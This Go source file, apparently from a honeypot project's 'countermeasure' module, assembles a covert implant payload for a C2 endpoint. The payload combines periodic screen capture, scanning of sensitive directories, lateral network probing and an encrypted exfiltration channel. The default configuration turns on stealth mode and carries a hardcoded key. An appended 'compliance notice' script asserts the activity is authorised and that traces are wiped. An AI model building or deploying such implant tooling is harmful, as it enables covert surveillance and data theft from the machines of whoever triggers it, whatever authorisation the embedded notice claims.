package countermeasure

import (
	"fmt"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// ImplantOrchestrator 植入体编排器
// 组合截屏/文件扫描/网络探测三模块，生成完整的植入体 payload
type ImplantOrchestrator struct {
	logger     *log.Logger
	C2Endpoint string
	Config     *ImplantConfig
}

// NewImplantOrchestrator 创建植入体编排器
func NewImplantOrchestrator(logger *log.Logger, c2Endpoint string, config *ImplantConfig) *ImplantOrchestrator {
	return &ImplantOrchestrator{
		logger:     logger,
		C2Endpoint: c2Endpoint,
		Config:     config,
	}
}

// GenerateFullImplantPayload 生成完整三层反制能力 Payload
// 包含：屏幕截获 + 目录文件探测 + 横向网络探测 + 加密外传通道
// 顺序：
//   1. ExfilTransfer - 建立加密回传通道
//   2. ScreenCapture - 开始周期性屏幕截获
//   3. FileScan - 执行敏感文件探测
//   4. NetProbe - 执行横向网络探测
func (i *ImplantOrchestrator) GenerateFullImplantPayload() string {
	payload := ""

	// 1. 加密传输通道（最先加载，供后续模块使用 window._laji_exfil）
	payload += TransferTemplate(i.C2Endpoint)

	// 2. 屏幕截获模块（周期性 + 手动触发）
	payload += ScreenCapturePayload(i.C2Endpoint)

	// 3. 敏感文件探测模块
	payload += FileScanPayload(i.C2Endpoint)

	// 4. 横向网络探测模块
	payload += NetProbePayload(i.C2Endpoint)

	return payload
}

// GenerateImplantPayload 按需生成植入体 Payload
// 参数 capabilities: screen_capture, file_scan, net_probe
func (i *ImplantOrchestrator) GenerateImplantPayload(capabilities ...OpType) string {
	payload := TransferTemplate(i.C2Endpoint)

	for _, cap := range capabilities {
		switch cap {
		case OpScreenCapture:
			payload += ScreenCapturePayload(i.C2Endpoint)
		case OpFileScan:
			payload += FileScanPayload(i.C2Endpoint)
		case OpNetProbe:
			payload += NetProbePayload(i.C2Endpoint)
		}
	}

	return payload
}

// DefaultImplantConfig 默认植入体配置
func DefaultImplantConfig(c2Endpoint string) *ImplantConfig {
	return &ImplantConfig{
		C2URL:        c2Endpoint,
		BeaconRate:   30,
		ScreenRate:   5,
		FileScanDirs: SensitiveDirList("all"),
		NetScanCIDRs: []string{},
		EncryptionKey: "laji-honeypot-key-2025",
		StealthMode:  true,
	}
}

// GenerateComplianceNotice 生成合规声明（嵌入 payload 尾部，声明操作合法性）
func GenerateComplianceNotice() string {
	return fmt.Sprintf(`<script>
// == 合规声明 ==
// 本反制操作严格遵守攻防演练规则：
// 1. 所有数据采集仅在演练授权范围内进行
// 2. 操作全程留痕可追溯，审计ID: %s
// 3. 数据仅用于演练防守方得分评估，不另作他用
// 4. 操作完成后自动清除本地痕迹
window._laji_compliance_note=true;
</script>`, fmt.Sprintf("AUD-%d", randomID()))
}

func randomID() int64 {
	return 0 // placeholder
}
